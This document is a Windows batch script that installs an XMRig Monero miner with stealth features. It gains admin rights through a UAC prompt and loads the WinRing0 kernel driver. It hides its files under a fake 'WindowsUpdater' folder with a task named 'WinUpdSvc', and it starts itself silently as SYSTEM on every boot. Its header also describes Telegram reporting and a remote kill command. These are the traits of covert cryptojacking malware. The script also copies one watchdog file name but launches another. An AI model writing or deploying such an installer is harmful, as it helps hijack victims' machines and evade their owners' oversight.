@echo off
title Monero Miner Setup - High Mid-End PC (i5-14400)
color 0A
setlocal enabledelayedexpansion

:: ===================================================
:: Monero Miner - Ultimate Edition (i5-14400, 16GB RAM)
:: Features:
:: - Auto-download latest XMRig from GitHub
:: - MSR mod (WinRing0 driver) auto-install
:: - Ultimate Performance power plan (full CPU potential)
:: - Core parking + HPET off
:: - Backup copy for self-repair (watchdog handles BIOS echo)
:: - Stealth autostart via Task Scheduler (SYSTEM)
:: - Silent watchdog with Telegram alerts + kill command
:: - Hashrate + shares sent to Telegram every 7 min
:: ===================================================

:: === CONFIG ===
set "SRC=%~dp0miner_src"
set "DEST=C:\ProgramData\WindowsUpdater"
set "BACKUP=%DEST%\backup"
set "TASK_NAME=WinUpdSvc"
set "LOG_FILE=%DEST%\miner.log"
set "GITHUB_API=https://api.github.com/repos/xmrig/xmrig/releases/latest"

:: === Elevate to Admin if needed ===
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' neq '0' (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\elevate.vbs"
    echo UAC.ShellExecute "%~f0", "", "", "runas", 1 >> "%temp%\elevate.vbs"
    "%temp%\elevate.vbs"
    del "%temp%\elevate.vbs"
    exit /b
)
echo [✔] Running with admin privileges.

:: === Prepare Install Paths ===
if not exist "%DEST%" mkdir "%DEST%"
if not exist "%BACKUP%" mkdir "%BACKUP%"

:: === Force Ultimate Performance Plan ===
echo [*] Enabling Ultimate Performance power plan...
powercfg /duplicatescheme e9a42b02-d5df-448d-aa00-03f14749eb61 >nul
powercfg /setactive e9a42b02-d5df-448d-aa00-03f14749eb61 >nul
powercfg /hibernate off
powercfg /change standby-timeout-ac 0
powercfg /change standby-timeout-dc 0
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "CsEnabled" /t REG_DWORD /d 0 /f >nul
bcdedit /deletevalue useplatformclock >nul 2>&1

:: === MSR Driver Setup (WinRing0) ===
echo [*] Setting up MSR mod (WinRing0)...
sc stop WinRing0_1_2_0 >nul 2>&1
sc delete WinRing0_1_2_0 >nul 2>&1
if exist "%SRC%\winring0x64.sys" (
    sc create WinRing0_1_2_0 binPath= "%SRC%\winring0x64.sys" type= kernel start= demand
    sc start WinRing0_1_2_0
)

:: === Auto-Update XMRig (latest release) ===
echo [*] Downloading latest XMRig...
set "URL="
for /f "delims=" %%A in ('powershell -NoProfile -Command ^
  "try {$r=Invoke-RestMethod -Uri '%GITHUB_API%' -UseBasicParsing -ErrorAction Stop;$a=$r.assets|?{$_.name-match'win64.*msvc.*zip'}|Select -First 1;if($a){$a.browser_download_url}else{''}}"') do set "URL=%%A"
if defined URL (
    powershell -Command "try {Invoke-WebRequest -Uri '%URL%' -OutFile '%TEMP%\xmrig.zip' -UseBasicParsing -ErrorAction Stop}" 2>> "%temp%\miner_debug.log"
    if exist "%TEMP%\xmrig.zip" (
        powershell -Command "Expand-Archive -Path '%TEMP%\xmrig.zip' -DestinationPath '%SRC%' -Force" 2>> "%temp%\miner_debug.log"
        del "%TEMP%\xmrig.zip"
    )
)

:: === Copy and Backup Miner Files ===
xcopy /Y /Q "%SRC%\*" "%DEST%\" >nul
xcopy /Y /Q "%SRC%\*" "%BACKUP%\" >nul

:: === Copy config.json explicitly ===
copy /Y "%SRC%\config.json" "%DEST%\config.json" >nul

:: === Copy Watchdog and rename ===
copy /Y "%SRC%\run_watchdogV2.bat" "%DEST%\run_watchdogV2.bat" >nul

:: === Silent Launcher for Startup ===
echo Set WshShell = CreateObject("WScript.Shell") > "%DEST%\run_silent.vbs"
echo WshShell.Run "%DEST%\run_watchdog.bat", 0, False >> "%DEST%\run_silent.vbs"

:: === Schedule Task to Run at Startup (Stealth, SYSTEM) ===
schtasks /create /tn "%TASK_NAME%" ^
  /tr "wscript.exe \"%DEST%\run_silent.vbs\"" ^
  /sc onstart /ru SYSTEM /rl HIGHEST /f

:: === Launch Watchdog (Visible only for first run) ===
call "%DEST%\run_watchdog.bat" visible

echo [✔] Miner installed and running.
echo [✔] It will auto-start silently on every reboot.
pause
